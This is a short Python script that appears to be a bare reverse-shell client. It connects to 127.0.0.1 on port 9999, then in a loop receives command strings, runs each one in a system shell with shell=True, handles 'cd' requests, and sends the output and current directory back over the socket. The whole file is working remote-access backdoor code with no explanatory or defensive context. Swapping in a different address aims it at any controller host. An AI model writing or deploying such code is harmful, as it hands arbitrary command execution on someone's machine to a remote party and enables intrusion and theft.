import os
import socket
import subprocess

s = socket.socket()
server_address = ('127.0.0.1', 9999)

s.connect(server_address)

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_string = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "

        s.send(str.encode(output_string + currentWD))

        print(output_string)
